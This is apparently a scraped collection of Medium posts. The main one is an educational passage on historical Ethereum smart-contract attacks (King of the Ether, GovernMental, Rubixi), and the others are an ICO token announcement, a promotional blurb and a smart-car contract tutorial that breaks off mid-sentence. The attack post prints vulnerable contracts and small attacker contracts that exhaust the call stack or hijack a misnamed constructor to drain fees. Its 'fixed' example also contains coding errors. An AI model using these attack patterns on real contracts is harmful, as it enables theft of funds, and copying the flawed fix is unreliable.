Theory\u201d or Ponzi-Scheme if you will\u2026The CodeBelow is a simplified version of the the original KotET contract. Take note of the fallback function, which is triggered when a player sends msg.value to the contract. The fallback function will first check to see if enough ether was sent to the king to take the throne. If not, the request is thrown and the code is reverted. If enough Ether is sent to claim the throne, the existing King receives said compensation (claim price less the commission fee) and the sender is crowned as the new King. To wrap things up a new claim price is calculated.contract KotET {    address public king;    uint public claimPrice = 100;    address owner;    //constructor, assigning ownership    constructor() {        owner = msg.sender;        king = msg.sender;    }    //for contract creator to withdraw commission fees    function sweepCommission(uint amount) {        owner.send(amount);    }    //fallback function    function() {        if (msg.value < claimPrice) revert;        uint compensation = calculateCompensation();                king.send(compensation);        king = msg.sender;        claimPrice = calculateNewPrice();    }}The fatal flaw of the KotET contract was the use of address.send() and the failure to check for an exception error upon an unsuccessful call. As I discussed in Smart Contract Attacks [Part 1], address.send() and address.transfer() are both limited to a stipend of 2300. While this is great for protecting against reentrancy attacks, the gas limit will result in a failure to send funds to the King\u2019s address if the King\u2019s contract has a fallback function costing > 2300 gas. This was the case for KotET, the payment to the dethroned King was sent to an Ethereum mist \u201ccontract-based wallet\u201d instead of a \u201ccontract account\u201d, which required more gas than available to successfully send the payment to the soon-to-be usurped King. The end result was an unsuccessful payment transfer and ether returned back to the KotET contract. Because payment could never be sent to the King, a new King was never crowned and the contract became stuck for all of time.The SolutionWe could make the contract more secure by replacing the contract\u2019s fallback function king.send(Compensation) with king.call.value(Compensation). The problem is that this would require the owner to assign a gas amount large enough to facilitate most receiving wallet contracts, but also low enough for most callers of the current contract\u200a\u2014\u200aa next to impossible task. Even if a gas amount wasn\u2019t specified, the contract could still be susceptible to a DoS attack. An attacker could create a contract with a fallback function that throws an exception revert()\u00a0. This would also cause the contract to become permanently stuck.KotET could have been solved in two ways:Throwing an exception and the call being reverted\u200a\u2014\u200awe can do this by simply adding revert to the function. This would stop the contract from being stuck in limbo, but would require additional steps to facilitate payment transfer. Two ideas that come to mind include the owner him/herself sending batched payments (too centralized), or implementing a batched payout that ensures payments are sent until there are no funds left in the \u201cjackpot\u201d.Implementing a withdraw pattern as opposed to a direct send call, the contract can be structured such that players can only cause his or her own withdraw to fail and not the rest of the contract.The only downside to a withdraw pattern is that it is much less autonomous and requires more user interaction. Let\u2019s take a look at how we could update the contract to implement these changes.contract KotET {    address public king;    uint public claimPrice = 100;    uint public resolutionFunds    address owner;    mapping (address => uint) creditedFunds;     //constructor, assigning ownership    constructor() {        owner = msg.sender;        king = msg.sender;    }     //for contract creator to withdraw commission fees    function sweepCommission(uint amount) {        owner.send(amount);    }     //for assigning new king and crediting balance    function becomeKing() public payable returns (bool) {        if (msg.value > claimPrice) {            creditedFunds[richest] += msg.value;            king = msg.sender;            return true;        } else {            return false;        }    }        function withdraw() public {        uint amount = creditedFunds[msg.sender];        //zeroing the balance BEFORE sending creditedFunds        //to prevent re-entrancy attacks        pendingWithdrawals[msg.sender] = 0;        msg.sender.transfer(amount);    }}BOOM! Now the contract no longer relies on a fallback function to execute the crowning of a new king and send funds directly to the usurped king. The contract is now secure from any fallback/reentrancy attacks that could potentially compromise the contract.Attack #2: Call Stack\u00a0AttackBefore EIP 150 was implemented, EVM had a reachable call stack depth of 1024 frames. What this meant was that someone could make a call to a contract 1023 times before automatically failing on the 1024th call. Attackers would intentionally reach the 1023rd call to cause the subsequent call to fail and position themselves to steal funds/obtain control of the contract.The AttackSimilarly to KotET, GovernMental was a ponzi game whereby participants sent a certain amount of ether to the contract to join. Winner of each round was subject to the round winning \u201cjackpot\u201d. The rules of the game were as follows:You must lend at least 1 ETH to the contract, you\u2019re entitled to be paid back + 10% interestIf the \u201cgovernment\u201d (contract) doesn\u2019t receive new money for 12 hours, the latest creditor receives the jackpot and all others will lose their claimsEther sent to the contract is distributed as such: 5% to the jackpot, 5% goes to the corrupt elite that runs the government (contract owner), 90% used to pay out creditors in order of their credit dateWhen jackpot is full (10K ETH), 95% is paid out to creditorsBonus: creditors can use an affiliate link for friends who want to join. If a friend makes contributions to the contract then 5% goes toward the creditor, 5% to the corrupt elite (contract owner), 5% into the jackpot, and 85% is used for payouts.The contract was written such that participants and their funds were recorded in 2 arrays, address[] public credAddr and uint[] public credAmt. Both of these arrays were to be reset at the end of each game. GovernMental was enough of a success that the arrays grew so large that the gas needed to clear them was more than the maximum allowed for a single transaction. The end result was a permanent freeze of the jackpot payout, which totaled roughly 1100 ether. However, a mere ~3 hours after Vitalik Buterin suggested on Reddit to pay the \u201c~50 ETH worth of transaction fees to spam the gas limit up to 5.1m\u201d, someone beganvspamming for the stuck reward. After about 2 months, the funds were finally unlocked and sent to the persistent caller.While GovernMental wasn\u2019t attacked by a malicious user/owner, it is a prime example of the damage that could have been done by a call stack attack. It also demonstrates the thoughtfulness one needs to exhibit when working with arrays and large datasets when fund ownership is involved.The CodeBelow is the complete and entire GovernMental smart contract code with a few shortened global variables. I\u2019ve included the real contract in its entirety because plenty can learned by examining this contract line by line, including how the contract was constructed. One can see the function lendGovernmentMoney() references the creditor\u2019s address and amount of ether required to reset or add to the existing arrays. Notice within this same function how funds are allocated between the contract owner and the last creditor when 12 hours have elapsed since the last creditor joined\u200a\u2014\u200acredAddr[credAddr.length 1].send(profitFromCrash); and corruptElite.send(this.balance);.contract Government {    // Global Variables    uint32 public lastPaid;    uint public lastTimeOfNewCredit;    uint public profitFromCrash;    address[] public credAddr;    uint[] public credit;    address public corruptElite;    mapping (address => uint) buddies;    uint constant TWELVE_HOURS = 43200;    uint8 public round;    // constructor    constructor() {        profitFromCrash = msg.value;        corruptElite = msg.sender;        lastTimeOfNewCredit = block.timestamp;    }    function lendGovernmentMoney(address buddy) returns (bool) {        uint amount = msg.value;                // check if the system already broke down.         // If 12h no new creditor gives new credit to         // the system it will brake down.        // 12h are on average = 60*60*12/12.5 = 3456        if (lastTimeOfNewCredit + TWELVE_HOURS < block.timestamp)             // Return money to sender            msg.sender.send(amount);                        // Sends all contract money to the last creditor            credAddr[credAddr.length - 1].send(profitFromCrash);            corruptElite.send(this.balance);                        // Reset contract state            lastPaid = 0;            lastTimeOfNewCredit = block.timestamp;             profitFromCrash = 0;            // this is where the arrays are cleared            credAddr = new address[](0);            credAmt = new uint[](0);            round += 1;            return false;        }         else {            // the system needs to collect at             // least 1% of the profit from a crash to stay alive            if (amount >= 10 ** 18) {                // the System has received fresh money,                 // it will survive at leat 12h more                lastTimeOfNewCredit = block.timestamp;                                // register the new creditor and his                 // amount with 10% interest rate                credAddr.push(msg.sender);                credAmt.push(amount * 110 / 100);                // now the money is distributed                // first the corrupt elite grabs 5% \u2014 thieves!                corruptElite.send(amount * 5/100);                // 5% are going into the economy (they will increase                // the value for the person seeing the crash coming)                if (profitFromCrash < 10000 * 10**18)                    profitFromCrash += amount * 5/100;                }                // if you have a buddy in the government (and he is                // in the creditor list) he can get 5% of your                 // credits. Make a deal with him.                if(buddies[buddy] >= amount) {                    buddy.send(amount * 5/100);                }                buddies[msg.sender] += amount * 110 / 100;                // 90% of money used to pay out old creditors                if (credAmt[lastPaid] <= address(this).balance \u2014 profitFromCrash){                   credAddr[lastPaid].send(credAmt[lastPaid]);                   buddies[credAddr[lastPaid]] -= credAmt[lastPaid];                   lastPaid += 1;                }                return true;            }             else {                msg.sender.send(amount);                return false;            }        }    }    // fallback function    function() {        lendGovernmentMoney(0);    }        function totalDebt() returns (uint debt) {        for(uint i=lastPaid; i<credAmt.length; i++){            debt += credAmt[i];        }    }    function totalPayedOut() returns (uint payout) {        for(uint i=0; i<lastPaid; i++){            payout += credAmt[i];        }    }    // donate funds to \"the government\"    function investInTheSystem() {        profitFromCrash += msg.value;    }    // From time to time the corrupt elite     // inherits it\u2019s power to the next generation    function inheritToNextGeneration(address nextGeneration) {        if (msg.sender == corruptElite) {            corruptElite = nextGeneration;        }    }    function getCreditorAddresses() returns (address[]) {        return credAddr;    }      function getCreditorAmounts() returns (uint[]) {        return credAmt;    }}Let\u2019s assume an attacker writes the following contract below to maliciously attack contract Government {}.contract attackGov { function attackGov (address target, uint count) {       if (0<= count && count<1023) {        this.attackGov.gas(gasleft() - 2000)(target, count+1);    }     else {       attackGov(target).lendGovernmentMoney;    }}The attacker calls contract attackGov{} to make recursive calls up until a stack size of 1023. When stack reaches 1022, function lendGovernmentMoney() is executed at stack size 1023. Because the 1024th call is designed to fail and send() doesn\u2019t check the returned code, Governmental\u2019s credAddr[credAddr.length\u200a\u2014\u200a1].send(profitFromCrash); fails. The contract then resets itself and the next round is ready to begin. Because payout had fail, the contract now has the jackpot from the last round and the owner will receive it on the next completed round, corruptElite.send(this.balance);.The SolutionSo how exactly can a call stack attack be avoided? Fortunately the Ethereum Improvement Protocol (EIP) 150 included an update making a call stack depth of 1024 next to impossible to reach. The rule states that the child of a call cannot consume more than 63/64 of the gas of the parent. To even get somewhat close to the call stack limit would be so incredibly costly that the attacker wouldn\u2019t think twice to proceed.On the other-hand, best practices when working with large arrays of data include:Writing contract such that it splits up the array clearing work among several transactions instead of one ORWriting contracts in a way that allows for users to separately handle the array elements associated with themselves.Attack #3\u200a\u2014\u200aImmutable Constructor BugWhat makes smart contracts so special? They\u2019re immutable. What make\u2019s smart contracts a nightmare? THEY\u2019RE IMMUTABLE. By now it\u2019s a forgone conclusion that plenty can go wrong when writing a smart contract. Before pushing a contract live, it\u2019s imperative that a process of thoroughly reviewing functions, global variables, and overall contract structure is undergone.If there is one smart contract that will go down in Ethereum history as the poster-child for negligent contract construction, it is undoubtedly Rubixi. Rubixi was another Ponzi Game where players would send ether to the contract with the expectation of receiving at least a moderately more amount of ether. However, at some point during the development on Rubixi the owner haphazardly changed the contract name and failed to check for any inconsistencies as a result of the change. Needless to say, Rubixi was far from being labeled a \u201csuccess\u201d.The Attack As of Solidity v0.4.24, the constructor function of a contract is denoted as construct(). However, when the Rubixi contract was created the constructor function was identified by the EVM by sharing the same name as the contract. The problem with Rubixi was that when the contract was deployed the constructor was set as function DynamicPyramid() and not function Rubixi(), meaning Rubixi was probably originally called \u201cDynamicPyramid\u201d. Because of this inconsistency the contract did not assign an owner upon contract creation and the keys to the castle were up for grabs. Anyone could assign themselves as owner of the contract and collect the contract fees generated by participating players.The CodeIf we pull the first few lines from the contract code you can see the delta between the contract name and the intended constructor function. If you want to look at the original Rubixi contract feel free to click here.contract Rubixi {    //Declare variables for storage critical to contract    uint private balance = 0;    uint private collectedFees = 0;    uint private feePercent = 10;    uint private pyramidMultiplier = 300;    uint private payoutOrder = 0;    address private creator;    //Sets creator    function DynamicPyramid() {        creator = msg.sender;    }The AttackAs you\u2019ve probably already figured out by now, all an attacker would have to do is create a contract calling function DynamicPyramid(), thus granting them ownership. From there, the attacker could call function collectAllFees() and cash out. Although the attack is pretty straight forward, Rubixi is another prime example of the importance behind thorough review of one\u2019s contract(s).contract extractRubixi {     address owner;    Rubixi r = Rubixi(0xe82...);     constructor() public {        owner=msg.sender;    }     function setAndGrab() public {        r.DynamicPyramid();        r.collectAllFees();    } }The SolutionFortunately Solidity has been updated such that the constructor function is defined by constructor() as opposed to contractName(). What we all can learn from this is to double, triple, quadruple check every aspect of your contract code and make sure you stay consistent through development. Nothing worse than deploying an immutable contract only to find a silly, yet costly, mistake.At The End of The\u00a0Day\u2026Ponzi Games might be a thing of the past, but as George Santayana once famously said, \u201cthose who cannot learn from history are doomed to repeat it\u201d. By learning from the failures of KotET, GovernMental, and Rubixi we can all save ourselves the headache of traveling down the wrong road yet again. Hopefully you\u2019re now walking away with a better comprehension of Solidity and you\u2019re feeling more confident about smart contract development. If you enjoyed this post, please feel free to leave a \u201cclap\u201d and/or comment!Want to Write Your First Smart Contract? Check Out My\u00a0TutorialSmart Contract Attacks [Part 1]\u200a\u2014\u200a3 Attacks We Should All Learn From The\u00a0DAOPete", "responses": ""}, {"title": "", "author_name": "Blockchain.io", "link": "https://medium.com/blockchainio/official-blockchainio-smart-contract-released-dc98f8af3272?source=search_post", "post_date": "Nov 28, 2018", "readtime": "2 min read", "upvotes": "322", "content": "Blockchain.ioBlockedUnblockFollowFollowingNov 28, 2018Dear Community,After the Blockchain.io Token Sale closed on October 25th, 2018, we are pleased to announce that we successfully deployed our official smart contract. A new milestone has been completed and we will soon be able to distribute BCIO tokens to ICO contributors.Smart Contract\u00a0AddressThe smart contract was successfully deployed on November 26th, marking the official birthday of the BCIO Token.Here is the official BCIO smart contract public address: 0xCDC412F306e0C51e3249B88C65423Cd16b322673Smart contracts with different public addresses claiming to manage BCIO tokens are not affiliated with Blockchain.io project and are likely to be scams.You can access the smart contract on EtherScan through the following URL: https://etherscan.io/address/0xCDC412F306e0C51e3249B88C65423Cd16b322673.We also registered the following custom URL to safely redirect to the official Blockchain.io smart-contract: https://etherscan.io/address/blockchainio.eth.The Generating TransactionDuring the deployment of the smart contract, 100 million BCIO tokens were created. BCIO Token is not minable, which means that new tokens cannot be created and the total supply is finite. You can check the generating transaction on EtherScan.The Burning TransactionAll unsold tokens during the Token Sale must be burned. Consequently, we\u2019ve burned 52,518,208 BCIO Tokens, bringing the total supply down to 47,481,792 BCIO Tokens. You can check the Burning transaction on EtherScan.Vesting Period for Team &\u00a0AdvisorsTokens for the Team & Advisors have been locked in vesting smart contracts. Vesting periods are detailed below:\u25cf Advisor tokens will be vested over a year with 3 months cliffs\u25cf Team tokens will be vested over two years with 6 months cliffsWhat\u2019s next for Token Sale Contributors?We\u2019ll start the KYC process once Blockchain.io platform has been launched. Token sale contributors will receive an email detailing the procedure to receive the tokens. Please remember that passing KYC is required to receive your tokens.Thank you for your patience in this ongoing and exciting journey. We can\u2019t wait for the tokens to be released and for seeing the first transactions on Blockchain.io platform!Would you have any questions, feel free to contact us at contact@blockchain.io or join the discussion on our official Telegram.The Blockchain.io Team", "responses": "1"}, {"title": "ZeroBank\u200a\u2014\u200aA global money transfer and exchange system based on Blockchain,Smart Contract Technologies and Sharing\u00a0Economy", "author_name": "ZEROBANK - Your Local Currency", "link": "https://medium.com/zerobank-cash/zerobank-40dd0f32b946?source=search_post", "post_date": "May 27, 2018", "readtime": "2 min read", "upvotes": "420", "content": "ZeroBank\u200a\u2014\u200aA global money transfer and exchange system based on Blockchain,Smart Contract Technologies and Sharing\u00a0EconomyZEROBANK - Your Local CurrencyBlockedUnblockFollowFollowingMay 27, 2018How ZeroBank System worksThe money transfer and exchange industry is not immune to the global movement towards decentralization and peer-to-peer sharing economies. In fact, these areas are poised to be some on the leading edge of those that thrive in this new paradigm.With the help of blockchain and smart contract technologies, along with the sharing economy model, ZeroBank will disrupt the outdated transfer and exchange models centralized around \u201ctoo-big-to-fail\u201d banking and MTO systems by bringing out a \u201cmoney barter\u201d model fit right in the current position of world money market.How ZeroBank System\u00a0work?The money transfer and exchange industry is not immune to the global movement towards decentralization and peer-to-peer sharing economies. In fact, these areas are poised to be some on the leading edge of those that thrive in this new paradigm.With the help of blockchain and smart contract technologies, along with the sharing economy model, ZeroBank will disrupt the outdated transfer and exchange models centralized around \u201ctoo-big-to-fail\u201d banking and MTO systems by bringing out a \u201cmoney barter\u201d model fit right in the current position of world money market.Stay updated on our channels:Website: www.zerobank.cashEmail: contact@zerobank.cashTelegram Community: https://t.me/zerobank_cashTelegram News: https://t.me/zerobank_newsChinese Community: https://t.me/zerobank_ChinesecommunityTwitter: https://twitter.com/zerobank_cashFacebook: https://www.facebook.com/zerobank.cash/", "responses": ""}, {"title": "A Smart Contract for a Smart\u00a0Car", "author_name": "Pablo Ruiz", "link": "https://hackernoon.com/a-smart-contract-for-a-smart-car-db08eda4bb4f?source=search_post", "post_date": "Nov 1, 2017", "readtime": "16 min read", "upvotes": "118", "content": "Photo by Evgeny Tchebotarev on\u00a0UnsplashA Smart Contract for a Smart\u00a0CarPablo RuizBlockedUnblockFollowFollowingNov 1, 2017Last year while I was attending a fintech conference I listened Brett King talking about how the cars of the future would be able not only to drive by themselves, but also, thanks to Blockchain technology they would be able to work for their owners. Since I heard that there have been a few developments in this area, but we are yet very far from being able to own a piece of a car that will drive for Uber instead of accumulating dust in a parking lot and making money for me while I\u2019m at the office.That talk stuck with me, but as much as I\u2019d like to build such a car, I don\u2019t even know how a regular car works. Fortunately for me, I do know a bit about software development and smart contracts, so in this article I\u2019d like to give some thought about how I\u2019d build such a contract for a driverless car.For this article I\u2019ll layout the basics of an autonomous car whose ownership is shared by several people. The car will be available for any 3rd party to rent it for the day and then, once the rental period is over it will distribute its earnings to the owners. (Minus eth gas stipends and other expenses).Some assumptions and considerations about this smart car and its\u00a0contractFor this analysis I will be making some assumptions that will simplify the logic of the smart contract.First, I\u2019ll be assuming that the car, somehow, is running a full node that allows it to sign transactions. The car would own an account/address which will be the \u201cowner\u201d of the smart contract that interacts with the different actors.Second, I won\u2019t be dealing with a lot of real-world issues such as the person renting the car stealing it, or being involved in an accident that renders the car unusable.Third, ownership of the car will be very simple. First of all, owners get a piece of the car from the get go, assuming the payment was made off-chain in the dealership. Then, each owner has an equal share of the car. Finally, we won\u2019t be dealing with complex decisions as this article would get very extensive.Finally, I\u2019m also assuming that the car, somehow, provides the user with some interface that is able to interact with the smart contract. Furthermore, the car can schedule certain functions to be called later in time, such as calling the function in the smart contract that ends the rental period after 24 hours. Also, I\u2019m assuming that the users posses a device capable of interacting with the blockchain such as a web3 enabled browser.The purpose of these assumptions is making the smart contract as simple as possible while leaving as many decisions as possible to the car itself. I\u2019m quite certain that what follows is possible in a real-world scenario, but may not be the optimal solution. By all means, feel free to discuss better approaches or point out parts of the contract that you think would not work at all in the real world.The Smart\u00a0ContractThe complete code for the smart car contract (v0.1) can be found in the following Github repo: https://github.com/pabloruiz55/SmartCar/blob/master/contracts/SmartCar.solWhat follows is not the complete code, but a highlight of the most important parts of it.Initializing the car smart\u00a0contract//The address of the car, which will sign transactions made by this contract.address public carSigner;// Value of the car, in weiuint public carValue;bytes32 public licensePlate;// Owners of the car, they will be the ones that receive payments from the car.// We assume each owner owns the car equally.address[] public owners;uint constant MAX_OWNERS = 100;//Earning from driving will be distributed to each owner for them to withdrawmapping (address => uint) public ownersBalance;uint public balanceToDistribute;uint constant INITIAL_CAR_SHARES = 100;mapping (address => uint) public carShares;DriverEntity currentDriverEntity;DriveStatus currentDriveStatus;//To keep track of who's currently using the car//If the owners are driving it, it will be their address.//If someone rented it, it will be the renter address, so he can be held accountable.//In this case, we could even ask for a warranty which will be sent back if the car is ok.address currentDriverAddress;uint currentDriveStartTime = 0;uint currentDriveRequiredEndTime = 0;//Ratesuint constant RATE_DAILYRENTAL = 1 ether; //1 ETHenum DriverEntity {    None,    Owner,    Autopilot,    Cab,    Uber,    DailyRental,    Other  }enum DriveStatus {    Idle,    Driving,    TurnedOff,    Unavailable  }// Somehow, the car should be able to communicate its \"internals\" to the contract.// These internals are the ones relevant to the functioning of the contract, such as it's fuel.// We don't care about oil or coolant for example, at this point at least.struct CarInternals {    uint fuel; //Measured in percentage  }CarInternals carInternals;bool carIsReady = false;modifier onlyIfReady {        require(carIsReady);        _;    }function SmartCar(bytes32 _licensePlate, uint _carValue){    require(_licensePlate.length >0 && _carValue > 0);    carSigner = msg.sender;    carValue = _carValue;    licensePlate = _licensePlate;    carShares[address(this)] = INITIAL_CAR_SHARES;    currentDriveStatus = DriveStatus.Idle;    currentDriverEntity = DriverEntity.None;    carInternals.fuel = 100;  }Let me explain each state variable and the constructor for the SmarCar contract:carSigner: This is the account that represents the car. As I mentioned before, the car is supposed to be running its own node which will sign the transactions that it needs to execute. This is the account that will deploy the contract for the car. In a real life scenario, I imagine the manufacturer setting up the car node and account. We would assume that neither the dealership nor the manufacturer has access to the private keys of this account. What I\u2019m trying to say is: The car will need to execute contract functions and the only way for it to do it would be if the car itself is an Externally Owned Account that can communicate with the smart contract without depending on human interaction.carValue / LicensePlate: This are values that should be provided when the car contract is deployed. LicensePlate could be used to identify the car (We are not making any checks to make sure it is unique, though) and carValue sets the price the owners paid for it. We are not using carValue, but we could have a function that allows an owner to sell his share of the car to someone else, and carValue/owners could be used for establishing a base price.owners / MAX_OWNERS = 100: Owners is an array that holds the address of all the owners of the car. MAX_OWNERS is a constant that will put a cap on how many owners the car can have.ownersBalance / balanceToDistribute: ownersBalance will be used to store the pending balance each owner has available for withdrawal. When the car starts a paid ride it will store the ether received in its own balance, then when the ride ends it will be distributed to each owner in equal parts for the owner to manually withdraw his balance.carShares / INITIAL_CAR_SHARES = 100: carShares is used to store how much of the car each owner has. For the time being, we made it so that each owner owns equal parts of the car, but it could be done so someone could own 50% of the car and other 10 people 5% each. That would also have to affect how earnings are distributed so it is done pro-rata.currentDriverEntity / currentDriveStatus: These variables are part of a state machine that will control what the car is currently doing. For instance, if its being driven, the contract shouldn\u2019t allow for someone else to rent it. We are also using DriverEntity to keep track of what the car is currently doing\u200a\u2014\u200aIs it working for Uber? Has it been rented for the day? Is one of the owners using it? This also raises a few more questions about how autonomous the car should be and how to determine what it should be doing, which I\u2019ll discuss at the end of the article, but that is also way out of the scope of this article.currentDriverAddress / currentDriveStartTime / currentDriveRequiredEndTime: These variables keep track of who has currently rented the car, when the rental period started and when it is supposed to end (24 hours after the rental period started). currentDriveRequiredEndTime is used to determine if the person that rented the car returned it within the specified rental period. For the time being we are just logging this, but some action could be taken if the conditions are not met.CarInternals: We are not doing anything with this yet, but this could be used to keep track of the internals of the car. Does it need fuel? What\u2019s the battery status? Does it need an oil change? Coolant? If any of these internals are in critical levels, what should it do?SmartCar constructor: The constructor of this contract is pretty straightforward. We are just setting the initial state of a few of these variables and most importantly assigning the carSigner.Assigning the\u00a0owners//We will assume, for the time being, that the owners are set by the carSigner automatically,//and that they can't be changed.//We are basically doing the purchase of the car, off-chain.//We also assume that each person payed the same amount for the car, thus owning equal shares.function setOwners(address[] _owners) public {  require(msg.sender == carSigner);  require(_owners.length > 0 && _owners.length <= MAX_OWNERS);  //Can only set owners once.  require(owners.length == 0);  owners = _owners;  //We take the total carShares the \"car\" owns and we distribute them equally among new owners  //If the shares are not properly divisible (I.E: 100 shares / 3 owners) the remaining shares stay with the car    uint sharesToDistribute = carShares[address(this)]/owners.length;  for (uint8 i; i<owners.length;i++){      carShares[owners[i]] = sharesToDistribute;      carShares[address(this)] -= sharesToDistribute;    }  carIsReady = true;}The setOwners function receives an array of addresses making them the owners of the car. After this function is called, the car will have one or more owners which will share the carShares in equal parts.\u00a0This function is meant to be called by the carSigner, which I don\u2019t yet know if optimal, but we are assuming this is set up at the dealership. So, as you must have figured out by now, there\u2019s a huge part of the system that still requires a lot of human interaction and coordination. In this case, the dealership would be responsible for having these owners pay their part of the deal and then, somehow, have the car register its brand new owners. I imagine the guy at the dealership using his password to unlock some kind of interface in the car that will prompt it to execute this function on the smart contract.Renting the car for the\u00a0day// Anyone can rent the car for the day, as long as it is idle.// In real life, the workflow could be as follows:// 1. User calls this function from his mobile device or browser web3 dapp, sending the correct amount of eth// 2. The system generates a PIN number (we are just using his address as PIN right now)// 3. User gets on the car and unlocks it using the pin.// As it stands, we assume that the car, somehow recognizes that the user// that paid is actually in the car. We added a activateCar function that// acts as if it was a PIN.function rentCarDaily() public onlyIfReady payable{  //No one must be using the car  require (currentDriveStatus == DriveStatus.Idle);  require (msg.value == RATE_DAILYRENTAL);  currentDriverAddress = msg.sender;  currentDriveStatus = DriveStatus.Driving;  currentDriverEntity = DriverEntity.DailyRental;  currentDriveStartTime = now;  currentDriveRequiredEndTime = now + 1 days;  balanceToDistribute += msg.value; // ADD SafeMath Library  E_RentCarDaily(currentDriverAddress,msg.value,   currentDriveStartTime,currentDriveRequiredEndTime);}Once the car has been acquired it is ready to be used. Right now we are only implementing one rental option: anyone can rent it by the day, by paying 1 eth (yes, since its a very novel and amazing car its price is outrageous).What this function basically does is to set its new state (being driven as a rental for the day) and registering who rented it, at what time and when he should be returning it. Also, we are adding the ether received to the contract\u2019s internal balance so it knows how much money should be later distributed to the owners.Once again, there\u2019s a lot of assumptions going on here. I\u2019m imagining the person renting the car used his web3 enabled browser to access a dapp to execute this function. But how does the car know that the person starting the car is this person. Well, we could have this function generate a receipt with a PIN number and have the car prompt for the PIN when someone tries to start it. Another solution could be to have the car prompt for payment when someone tries to drive it, but this would require a high level of trust as the driver would have to use his private key to sign the transaction in a rather public device. It would be a very risky proposition\u2026 I wouldn\u2019t try to access my home banking from a pc in a public library, why would I unlock my Ethereum account in a \u201cpublic\u201d car?// For the car to start it will ask the user for his PIN. Instead of generating a PIN  // we are using his address as PIN, making sure they match.  // This would be done in the car interface, of course it's a terrible user experience to as for an  // address instead of a 4 digit PIN, but it will do for now.  // We are not using this internally.function activateCar(address _user) public view onlyIfReady returns(bool){    require (_user == currentDriverAddress);    return true;  }Here\u2019s a very simplistic solution. Assume the car prompts the user to enter his address each time he tries to start the car. It would check if the address entered is the same that rented the car. Simple but suboptimal. For one, anyone could scan the latest transactions to know who rented it and use his address to \u201csteal\u201d the rental from them\u200a\u2014\u200athough this could be mitigated by hashing the address. Second, it\u2019s a terrible user experience! Imagine having to enter 42 characters in the car touchscreen just to start the car each time.Returning the car and distributing earnings// This should be called by the end of the rental period.// Driver would tell the car to end the rental and the car would execute this function.// Also, the car can call it if the rental period ended. (This would be scheduled car-side)// Here, we distribute earnings and do the necessary cleanup such as// issuing fuel recharge if needed.function endRentCarDaily () public onlyIfReady {  // The person renting the car can end the rental anytime.  // The carSigner can end the rental only after the renting period has ended  // in order to \"claim the car back\".  require ((msg.sender == carSigner && now > currentDriveRequiredEndTime)            || msg.sender == currentDriverAddress);  //To be called only if it is being rented for the day.  require (currentDriveStatus == DriveStatus.Driving);  require (currentDriverEntity == DriverEntity.DailyRental);  bool endedWithinPeriod = now <= currentDriveRequiredEndTime;  E_EndRentCarDaily(currentDriverAddress, now, endedWithinPeriod);  currentDriverAddress = address(0);  currentDriveStatus = DriveStatus.Idle;  currentDriverEntity = DriverEntity.None;  currentDriveStartTime = 0;  currentDriveRequiredEndTime = 0;  //Distribute earnings of the car rental  distributeEarnings();}Once the customer is done with the car he can return it by calling this function. This will basically end the rental period, make the car available again for others to rent it and distribute the earnings to the owners. The car itself can end the rental period if 24 hours have passed and the driver has not done it. For this to be possible, that car would have to schedule this function call internally as there is no way as of today for a contract function to be scheduled.Notice we are not doing anything to punish the driver for not returning the car in time, but something could be done like asking for a warranty payment beforehand and holding that in escrow until the car is returned. If they returned the car after the 24 hours rental period ended they could be charged extra.Also, we are not taking into account the fuel level the car had when it was rented. Should the driver return the car as it was when it was rented? Should he be charged more for the fuel difference?\u200a\u2014\u200aOr even refund money if gas was at 50% and they return it at 75%?//Distribute earnings to ownersfunction distributeEarnings() internal onlyIfReady {  //If the carSigner is running out of eth for transactions, transfer before distribution  transferEthForStipends();  //ETH should also be reserved for recharging fuel at a station.   Not considered yet.  //refuelCar();  uint earningsPerOwner = balanceToDistribute / owners.length;  for (uint8 i=0;i<owners.length;i++){   ownersBalance[owners[i]] += earningsPerOwner; // ADD SafeMath Library   balanceToDistribute -= earningsPerOwner; // ADD SafeMath Library  }}Once the car has been returned it will calculate and distribute the money to each one of the car shareholders. Before the money is distributed, it has to keep some money to pay for its own expenses, though.For the time being we are just considering the gas stipends the carSigner has to pay for for calling each and every function throughout the day. Each transaction the car does costs some gas and the carSigned is the one that pays for them in most cases, so it should have an allocation of ether for the car to be able to function properly.Here we could also calculate the fuel that was consumed and other expenses the car had to pay during this trip.\u200a\u2014\u200aTolls, public parking, etc.\u200a\u2014\u200aand keep that money before distributing its balance to the owners.// carSigner will need eth to pay for gas stipends being used throughout the day.// It should be able to get it from the car contract balance.// This would be called by the car automatically each day, for example.function triggerTransferEthForStipends() public onlyIfReady{  require(msg.sender == carSigner);  transferEthForStipends();}function transferEthForStipends() internal onlyIfReady {  uint amount = 1 * (10 ** 17);  // 0.1 eth per day should be enough  require (carSigner.balance < amount);  require(balanceToDistribute >= amount);  balanceToDistribute -= amount; // ADD SafeMath Library  carSigner.transfer(amount);  E_TransferEthForStipends(carSigner,amount, now);}This function makes sure carSigner (the car) has enough eth for calling the car contract functions throughout the day. This gets called after every ride, just in case, but can also be triggered by the car if it detected it doesn\u2019t have enough money to function properly.Withdrawal of\u00a0funds//Each owner should call this function to withdraw the balance they have pending.function withdrawEarnings() public onlyIfReady{  //Make sure the one calling the function is actually an owner  bool isOwner = false;    for (uint8 i=0;i<owners.length;i++){      if (owners[i] == msg.sender){        isOwner = true;        break;      }    }  require (isOwner);  uint balanceToWithdraw = ownersBalance[msg.sender];  require (balanceToWithdraw > 0);  ownersBalance[msg.sender] =0;  msg.sender.transfer(balanceToWithdraw);}Finally, at any time, each owner can execute this function to withdraw whatever pending balance they are owed.Where to go from\u00a0here?There are so many improvements that could be made to this contract that it\u2019s hard to figure out where to start. I\u2019ve raised a few concerns and pointed several places in the code where there could be room for improvement, for instance:Is there a better way to build this rather than having the car execute transactions? How can the car node be set up safely. Should the manufacturer do this? The dealership?We are not using carValue. Should we allow owners to sell their share of the car? Should we use carValue or the owner can set his asking price? Should anyone be able to sell his share of the car at any moment? Should there be a voting process? Can anyone buy it?We are not contemplating a case where someone could buy a bigger share of the car. Right now everyone has the same ownership percentage, and we are assuming the all paid the same amount of money at the dealership.\u200a\u2014\u200aWell, we are also assuming a dealership is prepared to have multiple people buy a share of a car in Fiat currency and somehow that translates to this on-chain scenario seamlessly,\u00a0:D\u200a\u2014\u200aSo, this could be done differently and not necessarily each owner should own the car in equal parts. This would also affect earnings distribution and expenses.Right now we assume the car is Idle and that anyone can come and rent it for the day (or an owner use it, or have it work for Uber, though these functions have not been implemented). But how should the car decide what it should do? Should it allow someone to rent it for the day without asking the owners if they will need it today? If several owners express their need to use the car, how will it be decided who has priority over it? If the car is meant only for rental, how does it decide when it\u2019s best to work for Uber or be rented for the day or work as a cab?When the car is 